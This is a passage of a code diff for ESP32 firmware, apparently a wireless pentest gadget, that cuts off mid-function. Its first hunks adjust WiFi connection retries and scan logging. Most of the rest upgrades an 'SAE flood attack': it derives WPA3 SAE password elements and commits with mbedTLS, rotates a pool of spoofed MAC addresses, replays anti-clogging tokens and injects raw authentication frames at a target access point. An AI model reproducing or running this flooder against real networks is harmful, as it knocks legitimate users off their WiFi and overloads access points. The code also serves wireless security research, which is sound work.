+    
+    // Enable scan method for better AP selection
+    wifi_config.sta.scan_method = WIFI_FAST_SCAN;
+    wifi_config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
+    
     // Ensure clean start state
-    esp_wifi_disconnect();
-    vTaskDelay(pdMS_TO_TICKS(500));
-    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
-
+    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT | WIFI_CONNECTING_BIT);
+    
+    // Set the connecting bit BEFORE any WiFi operations
+    xEventGroupSetBits(wifi_event_group, WIFI_CONNECTING_BIT);
+    
+    // Stop WiFi completely to ensure clean state
+    esp_wifi_stop();
+    vTaskDelay(pdMS_TO_TICKS(100));
+    
+    // Reconfigure and restart WiFi
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
     ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config));
     ESP_ERROR_CHECK(esp_wifi_start());
+    
+    // Wait for WiFi to be ready
+    vTaskDelay(pdMS_TO_TICKS(1000));
 
     int retry_count = 0;
-    const int max_retries = 5;
+    const int max_retries = 5;  // Reduced retry count for cleaner logs
     bool connected = false;
 
     while (retry_count < max_retries && !connected) {
+        if (retry_count > 0) {
+            printf("Retry attempt %d/%d...\n", retry_count, max_retries);
+            TERMINAL_VIEW_ADD_TEXT("Retry attempt %d/%d...\n", retry_count, max_retries);
+        }
+        
         esp_err_t ret = esp_wifi_connect();
         if (ret == ESP_ERR_WIFI_CONN) {
             ret = ESP_OK; // Already connecting, handled elsewhere
         }
 
         if (ret == ESP_OK) {
+            // Wait for connection with timeout
             EventBits_t bits = xEventGroupWaitBits(wifi_event_group, 
-                WIFI_CONNECTED_BIT, pdFALSE, pdTRUE, pdMS_TO_TICKS(8000));
+                WIFI_CONNECTED_BIT, pdFALSE, pdTRUE, pdMS_TO_TICKS(10000));
             
             if (bits & WIFI_CONNECTED_BIT) {
                 connected = true;
+                printf("Successfully connected to %s\n", ssid);
+                TERMINAL_VIEW_ADD_TEXT("Successfully connected to %s\n", ssid);
                 break;
             }
+        } else {
+            printf("Connection initiation failed (error: %d)\n", ret);
+            TERMINAL_VIEW_ADD_TEXT("Connection initiation failed (error: %d)\n", ret);
         }
 
         if (!connected) {
             esp_wifi_disconnect();
-            vTaskDelay(pdMS_TO_TICKS(1000));
             retry_count++;
+            if (retry_count < max_retries) {
+                vTaskDelay(pdMS_TO_TICKS(3000)); // 3 second delay between retries
+            }
         }
     }
 
+    // Clear the connecting bit as we're done with the manual connection attempt
+    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTING_BIT);
+
     if (!connected) {
-        TERMINAL_VIEW_ADD_TEXT("Failed after %d attempts\n", max_retries);
-        printf("Connection failed after %d attempts\n", max_retries);
+        TERMINAL_VIEW_ADD_TEXT("Failed to connect to %s after %d attempts\n", ssid, max_retries);
+        printf("Failed to connect to %s after %d attempts\n", ssid, max_retries);
         esp_wifi_disconnect();
     }
 }
@@ -3249,7 +4488,7 @@ void wifi_manager_start_station_scan() {
     // Ensure we have a list of APs to compare against first
     if (scanned_aps == NULL || ap_count == 0) {
         printf("No APs scanned previously. Performing initial scan...\n");
-        TERMINAL_VIEW_ADD_TEXT("Scanning APs first...\n");
+        TERMINAL_VIEW_ADD_TEXT("No APs scanned previously. Performing initial scan...\n");
 
         // Perform a synchronous scan
         ap_manager_stop_services(); // Stop other services that might interfere
@@ -3272,14 +4511,12 @@ void wifi_manager_start_station_scan() {
             uint16_t initial_ap_count = 0;
             err = esp_wifi_scan_get_ap_num(&initial_ap_count);
             if (err == ESP_OK) {
-                 printf("Initial scan found %u access points\n", initial_ap_count);
-                 TERMINAL_VIEW_ADD_TEXT("Initial scan found %u APs\n", initial_ap_count);
-                if (initial_ap_count > MAX_SCANNED_APS) {
-                    printf("too many aps (%u). truncating list to first %d\n", initial_ap_count, MAX_SCANNED_APS);
-                    TERMINAL_VIEW_ADD_TEXT("showing first %d aps (truncated)\n", MAX_SCANNED_APS);
-                    initial_ap_count = MAX_SCANNED_APS;
-                }
-                if (initial_ap_count > 0) {
+                 char log_buf[128];
+                 snprintf(log_buf, sizeof(log_buf), "Initial scan found %u access points\n", initial_ap_count);
+                 printf("%s", log_buf);
+                 TERMINAL_VIEW_ADD_TEXT(log_buf);
+
+                 if (initial_ap_count > 0) {
                     if (scanned_aps != NULL) {
                         free(scanned_aps);
                         scanned_aps = NULL;
@@ -3301,19 +4538,25 @@ void wifi_manager_start_station_scan() {
 
                               // ---- ADD THIS BLOCK START ----
                               printf("--- Known AP BSSIDs for Station Scan ---\n");
+                              TERMINAL_VIEW_ADD_TEXT("--- Known AP BSSIDs for Station Scan ---\n");
                               for (int k = 0; k < ap_count; k++) {
-                                  printf("[%d] BSSID: %02X:%02X:%02X:%02X:%02X:%02X (SSID: %.*s)\n", k,
+                                  char bssid_log_buf[128];
+                                  snprintf(bssid_log_buf, sizeof(bssid_log_buf), "[%d] BSSID: %02X:%02X:%02X:%02X:%02X:%02X (SSID: %.*s)\n", k,
                                          scanned_aps[k].bssid[0], scanned_aps[k].bssid[1],
                                          scanned_aps[k].bssid[2], scanned_aps[k].bssid[3],
                                          scanned_aps[k].bssid[4], scanned_aps[k].bssid[5],
                                          32, scanned_aps[k].ssid); // Print SSID for context
+                                  printf("%s", bssid_log_buf);
+                                  TERMINAL_VIEW_ADD_TEXT(bssid_log_buf);
                               }
                               printf("----------------------------------------\n");
+                              TERMINAL_VIEW_ADD_TEXT("----------------------------------------\n");
                               // ---- ADD THIS BLOCK END ----
                          }
                      }
                  } else {
                       printf("Initial scan found no access points\n");
+                      TERMINAL_VIEW_ADD_TEXT("Initial scan found no access points\n");
                       ap_count = 0;
                  }
             } else {
@@ -3369,7 +4612,7 @@ void wifi_manager_scanall_chart() {
     }
 
     printf("\n--- Combined AP and Station Scan Results ---\n\n");
-    TERMINAL_VIEW_ADD_TEXT("\n--- Combined AP/STA Scan Results ---\n\n");
+    TERMINAL_VIEW_ADD_TEXT("\n--- Combined AP and Station Scan Results ---\n\n");
 
     const char* ap_header_top =    "┌──────────────────────────────────┬───────────────────┬──────┬───────────┐";
     const char* ap_header_mid =    "│ SSID                             │ BSSID             │ Chan │ Company   │";
@@ -3810,111 +5053,527 @@ static int sae_flood_packets_sent = 0;
 static uint8_t sae_target_bssid[6];
 static int sae_target_channel = 1;
 static int sae_injection_rate = 25;
+// Limit the number of unique spoofed MACs to reduce crypto context thrash
+#define SAE_MAC_POOL_SIZE 8
+#define SAE_PRECOMPUTE_LIMIT 8
+static uint8_t sae_mac_pool[SAE_MAC_POOL_SIZE][6];
+static bool sae_mac_pool_ready = false;
+// Number of frames to send per MAC before switching to the next one
+static int sae_frames_per_mac = 32;
+// Cached commit data per MAC
+// Element is 32-byte X coordinate for P-256 (SAE commit encoding)
+static uint8_t sae_commit_element_cache[SAE_MAC_POOL_SIZE][33];
+static uint8_t sae_commit_scalar_cache[SAE_MAC_POOL_SIZE][32];
+static bool sae_commit_cache_ready[SAE_MAC_POOL_SIZE];
+static bool sae_precompute_attempted[SAE_MAC_POOL_SIZE];
+static uint16_t sae_seq_counters[SAE_MAC_POOL_SIZE];
+static uint32_t sae_cache_hits = 0;
+static uint32_t sae_cache_misses = 0;
+static uint32_t sae_pwe_failures = 0;
+static uint32_t sae_token_rx = 0;
+static uint32_t sae_commit_tx_ok = 0;
+static uint32_t sae_commit_tx_err = 0;
+static uint32_t sae_status76_rx = 0;
+static uint32_t sae_status0_rx = 0;
+// Track which spoofed MAC the anti-clogging token belongs to
+static uint8_t sae_token_mac[6];
+static bool sae_token_mac_valid = false;
 
-// SAE Commit frame template (simplified for ESP32)
-static const uint8_t SAE_COMMIT_TEMPLATE[] = {
-    // 802.11 Authentication frame header
-    0xb0, 0x00,                     // Frame Control (Authentication)
-    0x00, 0x00,                     // Duration
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (will be filled)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be filled)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be filled)
-    0x00, 0x00,                     // Sequence Control
-    
-    // Authentication frame body
-    0x03, 0x00,                     // Algorithm (SAE = 3)
-    0x01, 0x00,                     // Transaction Sequence (Commit = 1)
-    0x00, 0x00,                     // Status Code (Success = 0)
-    0x13, 0x00,                     // Group ID (19 = P-256)
-    
-    // Simplified scalar (32 bytes for P-256)
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
-    0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
-    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
-    0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
-    
-    // Simplified element (64 bytes for P-256 - X and Y coordinates)
-    0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
-    0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30,
-    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
-    0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40,
-    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
-    0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50,
-    0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
-    0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60
-};
+// SAE protocol state and variables
+typedef struct {
+    uint8_t peer_mac[6];
+    uint8_t own_mac[6];
+    uint8_t bssid[6];
+    char password[64];
+    mbedtls_ecp_group group;
+    mbedtls_ecp_point pwe;          // Password Element
+    mbedtls_ecp_point peer_element;
+    mbedtls_ecp_point own_element;
+    mbedtls_mpi peer_scalar;
+    mbedtls_mpi own_scalar;
+    mbedtls_mpi rand;
+    mbedtls_mpi mask;
+    uint8_t kck[32];
+    uint8_t pmk[32];
+    uint8_t token[32];
+    uint16_t token_len;
+    bool token_required;
+    int sync;
+    int rc;
+} sae_data_t;
 
-static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
-    uint8_t frame[sizeof(SAE_COMMIT_TEMPLATE)];
-    memcpy(frame, SAE_COMMIT_TEMPLATE, sizeof(SAE_COMMIT_TEMPLATE));
+static sae_data_t sae_ctx;
+static bool sae_initialized = false;
+static portMUX_TYPE sae_lock = portMUX_INITIALIZER_UNLOCKED;
+
+// Forward declarations
+static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac, const uint8_t *peer_mac, const char *ssid);
+static esp_err_t sae_generate_commit(sae_data_t *sae);
+
+/**
+ * Derive Password-to-Element (PWE) using hunt-and-peck method
+ * Based on IEEE 802.11-2016 Section 12.4.4.2.2
+ */
+// Static buffers to reduce stack usage
+static uint8_t sae_pwd_seed[128];
+static uint8_t sae_pwd_value[32];
+
+// Static mbedTLS contexts to reduce stack usage
+static mbedtls_entropy_context sae_entropy;
+static mbedtls_ctr_drbg_context sae_ctr_drbg;
+static mbedtls_sha256_context sae_sha256;
+static mbedtls_ecp_point sae_tmp_point;
+static bool sae_crypto_initialized = false;
+
+static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1, 
+                                const uint8_t *addr2, const char *ssid,
+                                mbedtls_ecp_point *pwe, mbedtls_ecp_group *group) {
+    mbedtls_mpi x, y, tmp;
+    int counter = 1;
+    bool found = false;
+    (void)ssid;
+    ESP_LOGI("SAE_PWE", "derive start");
     
-    // Fill in MAC addresses
-    memcpy(frame + 4, sae_target_bssid, 6);   // Destination (AP)
-    memcpy(frame + 10, src_mac, 6);           // Source (spoofed client)
-    memcpy(frame + 16, sae_target_bssid, 6);  // BSSID
+    mbedtls_mpi_init(&x); mbedtls_mpi_init(&y); mbedtls_mpi_init(&tmp);
+    mbedtls_sha256_init(&sae_sha256);
     
-    // Randomize scalar and element to create unique frames
-    for (int i = 32; i < sizeof(SAE_COMMIT_TEMPLATE); i++) {
-        frame[i] = esp_random() & 0xFF;
+    // Hunt-and-peck to find valid point
+    while (!found && counter <= 40) {
+        // Create pwd-seed = max(addr1, addr2) || min(addr1, addr2) || password || counter
+        int pos = 0;
+        if (memcmp(addr1, addr2, 6) > 0) {
+            memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
+            memcpy(sae_pwd_seed + pos, addr2, 6); pos += 6;
+        } else {
+            memcpy(sae_pwd_seed + pos, addr2, 6); pos += 6;
+            memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
+        }
+        
+        int pwd_len = strlen(password);
+        memcpy(sae_pwd_seed + pos, password, pwd_len);
+        pos += pwd_len;
+        sae_pwd_seed[pos++] = counter;
+        
+        // pwd-value = SHA-256(pwd-seed)
+        mbedtls_sha256_starts(&sae_sha256, 0);
+        mbedtls_sha256_update(&sae_sha256, sae_pwd_seed, pos);
+        mbedtls_sha256_finish(&sae_sha256, sae_pwd_value);
+        
+        // Convert to x coordinate
+        mbedtls_mpi_read_binary(&x, sae_pwd_value, 32);
+        mbedtls_mpi_mod_mpi(&x, &x, &group->P);
+        
+        // Check if x^3 + a*x + b is quadratic residue and try both parities
+        mbedtls_mpi_mul_mpi(&tmp, &x, &x);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        mbedtls_mpi_mul_mpi(&tmp, &tmp, &x);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        mbedtls_mpi_mul_mpi(&y, &group->A, &x);
+        mbedtls_mpi_mod_mpi(&y, &y, &group->P);
+        mbedtls_mpi_add_mpi(&tmp, &tmp, &y);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        mbedtls_mpi_add_mpi(&tmp, &tmp, &group->B);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        
+        uint8_t point_buf[33];
+        memcpy(point_buf + 1, sae_pwd_value, 32);
+        point_buf[0] = 0x02;
+        if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
+            found = true;
+        } else {
+            point_buf[0] = 0x03;
+        if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
+            found = true;
+        } else {
+            counter++;
+            }
+        }
     }
     
-    // Add some randomization to sequence control for better variation
-    uint16_t seq = (esp_random() & 0xFFF0) | (frame_counter & 0x000F);
-    frame[22] = seq & 0xFF;
-    frame[23] = (seq >> 8) & 0xFF;
+    mbedtls_mpi_free(&x); mbedtls_mpi_free(&y); mbedtls_mpi_free(&tmp);
+    mbedtls_sha256_free(&sae_sha256);
+    ESP_LOGI("SAE_PWE", "derive %s", found ? "ok" : "fail");
     
-    // Vary the Group ID occasionally for more diversity
-    if ((frame_counter % 50) == 0) {
-        uint16_t group_ids[] = {19, 20, 21}; // P-256, P-384, P-521
-        uint16_t group_id = group_ids[esp_random() % 3];
-        frame[30] = group_id & 0xFF;
-        frame[31] = (group_id >> 8) & 0xFF;
+    return found ? ESP_OK : ESP_FAIL;
+}
+
+/**
+ * Generate SAE commit scalar and element
+ */
+static esp_err_t sae_generate_commit(sae_data_t *sae) {
+    ESP_LOGI("SAE_COMMIT", "gen start");
+    // Initialize crypto contexts once
+    if (!sae_crypto_initialized) {
+        mbedtls_entropy_init(&sae_entropy);
+        mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+        mbedtls_ecp_point_init(&sae_tmp_point);
+        if (mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0) != 0) {
+            ESP_LOGI("SAE_COMMIT", "drbg seed fail");
+            return ESP_FAIL;
+        }
+        sae_crypto_initialized = true;
     }
     
-    // Inject the frame
-    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-    sae_flood_packets_sent++;
+    // Generate random scalar and mask
+    mbedtls_mpi_fill_random(&sae->rand, 32, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
+    mbedtls_mpi_fill_random(&sae->mask, 32, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
+    
+    // scalar = (rand + mask) mod order
+    mbedtls_mpi_add_mpi(&sae->own_scalar, &sae->rand, &sae->mask);
+    mbedtls_mpi_mod_mpi(&sae->own_scalar, &sae->own_scalar, &sae->group.N);
+    if (mbedtls_mpi_cmp_int(&sae->own_scalar, 0) == 0) {
+        mbedtls_mpi_lset(&sae->own_scalar, 1);
+    }
+    // own_element = (N - (mask mod N)) * PWE  [equivalent to -(mask * PWE) mod N]
+    {
+        mbedtls_mpi mask_mod, mask_neg;
+        mbedtls_mpi_init(&mask_mod);
+        mbedtls_mpi_init(&mask_neg);
+        mbedtls_mpi_mod_mpi(&mask_mod, &sae->mask, &sae->group.N);
+        if (mbedtls_mpi_cmp_int(&mask_mod, 0) == 0) {
+            mbedtls_mpi_lset(&mask_mod, 1);
+        }
+        mbedtls_mpi_sub_mpi(&mask_neg, &sae->group.N, &mask_mod);
+        if (mbedtls_mpi_cmp_int(&mask_neg, 0) == 0) {
+            mbedtls_mpi_lset(&mask_neg, 1);
+        }
+        if (mbedtls_ecp_mul(&sae->group, &sae->own_element, &mask_neg, &sae->pwe,
+                            mbedtls_ctr_drbg_random, &sae_ctr_drbg) != 0) {
+            mbedtls_mpi_free(&mask_mod);
+            mbedtls_mpi_free(&mask_neg);
+            return ESP_FAIL;
+        }
+        mbedtls_mpi_free(&mask_mod);
+        mbedtls_mpi_free(&mask_neg);
+    }
+    ESP_LOGI("SAE_COMMIT", "gen ok");
+    return ESP_OK;
+}
+
+/**
+ * Calculate SAE confirm value
+ */
+static esp_err_t sae_calculate_confirm(sae_data_t *sae, uint16_t send_confirm, uint8_t *confirm) {
+    int ret;
+    mbedtls_ecp_point_init(&sae_tmp_point);
+
+    // Compute shared secret: own_scalar * peer_element
+    ret = mbedtls_ecp_mul(&sae->group, &sae_tmp_point, &sae->own_scalar,
+                          &sae->peer_element, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
+    if (ret != 0) goto cleanup;
+
+    // Extract X coordinate (big-endian, 32 bytes) as K
+    uint8_t k[33];
+    size_t olen;
+    mbedtls_ecp_point_write_binary(&sae->group, &sae_tmp_point,
+                                   MBEDTLS_ECP_PF_COMPRESSED, &olen,
+                                   k, sizeof(k));
+    // Skip compression byte by shifting buffer
+    uint8_t *kptr = k + 1;
+
+    // Confirm = SHA256(be16(send_confirm) || K)
+    mbedtls_sha256_init(&sae_sha256);
+    mbedtls_sha256_starts(&sae_sha256, 0);
+    uint8_t sc_be[2] = { (uint8_t)(send_confirm & 0xFF), (uint8_t)((send_confirm >> 8) & 0xFF) };
+    uint8_t tmp_swap = sc_be[0]; sc_be[0] = sc_be[1]; sc_be[1] = tmp_swap;
+    mbedtls_sha256_update(&sae_sha256, sc_be, sizeof(sc_be));
+    mbedtls_sha256_update(&sae_sha256, kptr, 32);
+    mbedtls_sha256_finish(&sae_sha256, confirm);
+    mbedtls_sha256_free(&sae_sha256);
+    
+cleanup:
+    mbedtls_ecp_point_free(&sae_tmp_point);
+    return (ret == 0 ? ESP_OK : ESP_FAIL);
+}
+
+/**
+ * Initialize SAE context with proper PWE derivation
+ */
+static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac,
+                                  const uint8_t *peer_mac, const char *ssid) {
+    // Reuse if already initialized for the same MAC tuple
+    if (sae_initialized &&
+        memcmp(sae_ctx.own_mac, own_mac, 6) == 0 &&
+        memcmp(sae_ctx.peer_mac, peer_mac, 6) == 0) {
+        return ESP_OK;
+    }
+
+    if (!sae_initialized) {
+        memset(&sae_ctx, 0, sizeof(sae_ctx));
+        mbedtls_ecp_group_init(&sae_ctx.group);
+        mbedtls_ecp_point_init(&sae_ctx.pwe);
+        mbedtls_ecp_point_init(&sae_ctx.peer_element);
+        mbedtls_ecp_point_init(&sae_ctx.own_element);
+        mbedtls_mpi_init(&sae_ctx.peer_scalar);
+        mbedtls_mpi_init(&sae_ctx.own_scalar);
+        mbedtls_mpi_init(&sae_ctx.rand);
+        mbedtls_mpi_init(&sae_ctx.mask);
+        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            return ESP_FAIL;
+        }
+        sae_initialized = true;
+    }
+
+    strncpy(sae_ctx.password, password, sizeof(sae_ctx.password) - 1);
+    memcpy(sae_ctx.own_mac, own_mac, 6);
+    memcpy(sae_ctx.peer_mac, peer_mac, 6);
+    memcpy(sae_ctx.bssid, peer_mac, 6);
+    
+    // Derive PWE with the provided MAC addresses
+    if (sae_derive_pwe(password, own_mac, peer_mac, ssid, &sae_ctx.pwe, &sae_ctx.group) != ESP_OK) {
+        return ESP_FAIL;
+    }
+    
+    return ESP_OK;
+}
+
+// Static frame buffer to reduce stack usage
+static uint8_t sae_frame_buffer[512];
+
+static char sae_flood_password_buf[64];
+
+static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
+    int frame_len = 0;
+    bool token_required_local = false;
+    uint16_t token_len_local = 0;
+    uint8_t token_buf_local[128];
+    
+    // 802.11 Authentication header
+    sae_frame_buffer[0] = 0xb0; sae_frame_buffer[1] = 0x00;  // Frame Control
+    sae_frame_buffer[2] = 0x00; sae_frame_buffer[3] = 0x00;  // Duration
+    // Addresses: DA, SA, BSSID
+    memcpy(sae_frame_buffer + 4, sae_target_bssid, 6);
+    memcpy(sae_frame_buffer + 10, src_mac, 6);
+    memcpy(sae_frame_buffer + 16, sae_target_bssid, 6);
+    // Sequence Control: fragment number = 0, 12-bit seq number random
+    uint16_t seq = esp_random() & 0x0FFF;
+    sae_frame_buffer[22] = (seq << 4) & 0xF0;
+    sae_frame_buffer[23] = (seq >> 4) & 0xFF;
+    frame_len = 24;
+    
+    // Auth Algorithm = SAE (3), Sequence = Commit (1), Status = 0
+    sae_frame_buffer[frame_len++] = 0x03; sae_frame_buffer[frame_len++] = 0x00;  // Algorithm
+    sae_frame_buffer[frame_len++] = 0x01; sae_frame_buffer[frame_len++] = 0x00;  // Transaction
+    sae_frame_buffer[frame_len++] = 0x00; sae_frame_buffer[frame_len++] = 0x00;  // Status
+    
+    // Group ID = P-256 (19)
+    sae_frame_buffer[frame_len++] = 0x13; sae_frame_buffer[frame_len++] = 0x00;
+    
+    // Read anti-clogging token if required (write it later after scalar+element)
+    portENTER_CRITICAL(&sae_lock);
+    token_required_local = sae_ctx.token_required;
+    token_len_local = sae_ctx.token_len;
+    if (token_required_local && token_len_local > 0) {
+        if (token_len_local > sizeof(token_buf_local)) token_len_local = sizeof(token_buf_local);
+        memcpy(token_buf_local, sae_ctx.token, token_len_local);
+    }
+    portEXIT_CRITICAL(&sae_lock);
+    ESP_LOGI("SAE_TX", "commit hdr ok, token=%d len=%u", token_required_local, (unsigned)token_len_local);
+    
+    // Initialize base crypto once
+    static const char *sae_flood_password = NULL;
+    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
+    const char *ssid = NULL;
+    if (!sae_crypto_initialized) {
+        mbedtls_entropy_init(&sae_entropy);
+        mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+        mbedtls_ecp_point_init(&sae_tmp_point);
+        mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
+        sae_crypto_initialized = true;
+    }
+    if (!sae_initialized) {
+        mbedtls_ecp_group_init(&sae_ctx.group);
+        mbedtls_ecp_point_init(&sae_ctx.pwe);
+        mbedtls_ecp_point_init(&sae_ctx.peer_element);
+        mbedtls_ecp_point_init(&sae_ctx.own_element);
+        mbedtls_mpi_init(&sae_ctx.peer_scalar);
+        mbedtls_mpi_init(&sae_ctx.own_scalar);
+        mbedtls_mpi_init(&sae_ctx.rand);
+        mbedtls_mpi_init(&sae_ctx.mask);
+        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            return ESP_FAIL;
+        }
+        sae_initialized = true;
+    }
+
+    // Use cached commit for this MAC if available
+    int pool_idx = -1;
+    if (sae_mac_pool_ready) {
+        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+            if (memcmp(sae_mac_pool[i], src_mac, 6) == 0) { pool_idx = i; break; }
+        }
+    }
+    bool used_cache = false;
+    if (pool_idx >= 0 && pwd && strlen(pwd) > 0 && sae_commit_cache_ready[pool_idx]) {
+        portENTER_CRITICAL(&sae_lock);
+        memcpy(sae_ctx.own_mac, src_mac, 6);
+        memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
+        memcpy(sae_ctx.bssid, sae_target_bssid, 6);
+        mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[pool_idx], 32);
+        portEXIT_CRITICAL(&sae_lock);
+        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
+            return ESP_ERR_NO_MEM;
+        }
+        memcpy(sae_frame_buffer + frame_len, sae_commit_scalar_cache[pool_idx], 32);
+        frame_len += 32;
+        memcpy(sae_frame_buffer + frame_len, sae_commit_element_cache[pool_idx] + 1, 32);
+        frame_len += 32;
+        used_cache = true;
+        sae_cache_hits++;
+        ESP_LOGI("SAE_TX", "cache hit idx=%d", pool_idx);
+    } else {
+        // Fall back to on-demand derivation/generation when no cache; require password/PWE
+        if (!(pwd && strlen(pwd) > 0)) return ESP_FAIL;
+        if (sae_init_context(pwd, src_mac, sae_target_bssid, ssid) != ESP_OK ||
+            sae_generate_commit(&sae_ctx) != ESP_OK) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            mbedtls_ecp_point_free(&sae_ctx.pwe);
+            mbedtls_ecp_point_free(&sae_ctx.peer_element);
+            mbedtls_ecp_point_free(&sae_ctx.own_element);
+            mbedtls_mpi_free(&sae_ctx.peer_scalar);
+            mbedtls_mpi_free(&sae_ctx.own_scalar);
+            mbedtls_mpi_free(&sae_ctx.rand);
+            mbedtls_mpi_free(&sae_ctx.mask);
+            memset(&sae_ctx, 0, sizeof(sae_ctx));
+            sae_initialized = false;
+                return ESP_FAIL;
+            }
+        sae_cache_misses++;
+        ESP_LOGI("SAE_TX", "cache miss derive ok");
+    }
+    
+    if (!used_cache) {
+        // Element: 32-byte X coordinate of own_element
+        uint8_t element_x[32];
+        size_t elen = 0;
+        uint8_t element_buf[33];
+        if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
+                                           MBEDTLS_ECP_PF_COMPRESSED, &elen,
+                                           element_buf, sizeof(element_buf)) != 0 || elen < 33) {
+            return ESP_FAIL;
+        }
+        memcpy(element_x, element_buf + 1, 32);
+        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
+            return ESP_ERR_NO_MEM;
+        }
+        // Scalar (32 bytes)
+        mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
+        frame_len += 32;
+        memcpy(sae_frame_buffer + frame_len, element_x, 32);
+        frame_len += 32;
+    }
+    ESP_LOGI("SAE_TX", "frm len=%d", frame_len);
+
+    // Append anti-clogging token (after scalar + element)
+    if (token_required_local && token_len_local > 0) {
+        size_t remaining = sizeof(sae_frame_buffer) - frame_len;
+        if ((size_t)token_len_local > remaining) token_len_local = (uint16_t)remaining;
+        if (token_len_local > 0) {
+            memcpy(sae_frame_buffer + frame_len, token_buf_local, token_len_local);
+            frame_len += token_len_local;
+        }
+    }
+    
+    // Transmit commit frame
+    // Maintain a per-MAC seq counter to keep auth seq control more stable
+    if (pool_idx >= 0) {
+        uint16_t s = ++sae_seq_counters[pool_idx] & 0x0FFF;
+        sae_frame_buffer[22] = (s << 4) & 0xF0;
+        sae_frame_buffer[23] = (s >> 4) & 0xFF;
+    }
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, sae_frame_buffer, frame_len, false);
+    if (err == ESP_OK) {
+        sae_flood_packets_sent++;
+        sae_commit_tx_ok++;
+        ESP_LOGI("SAE_TX", "tx ok");
+    } else {
+        ESP_LOGE("SAE_FLOOD", "SAE commit injection failed: %s", esp_err_to_name(err));
+        sae_commit_tx_err++;
+    }
+    return err;
 }
 
 static void sae_flood_task(void *param) {
     uint8_t spoofed_mac[6];
     uint8_t base_mac[6];
     int frame_counter = 0;
+    int backoff_ms = 0;
+    int consecutive_no_mem = 0;
+    int rate_scale_pct = 100;
+    int success_streak = 0;
     
     // Get base MAC address
     esp_wifi_get_mac(WIFI_IF_STA, base_mac);
     
-    printf("SAE flood attack started on channel %d\n", sae_target_channel);
-    TERMINAL_VIEW_ADD_TEXT("SAE flood attack started on channel %d\n", sae_target_channel);
-    printf("Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+    printf("SAE flood started on ch %d\n", sae_target_channel);
+    printf("Target: %02x:%02x:%02x:%02x:%02x:%02x\n", 
            sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
            sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
-    TERMINAL_VIEW_ADD_TEXT("Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", 
-                          sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
-                          sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
-    printf("Injection rate: %d frames/second\n", sae_injection_rate);
-    TERMINAL_VIEW_ADD_TEXT("Injection rate: %d frames/second\n", sae_injection_rate);
+    printf("Rate: %d fps\n", sae_injection_rate);
     
     while (sae_flood_running) {
-        // Generate spoofed MAC address
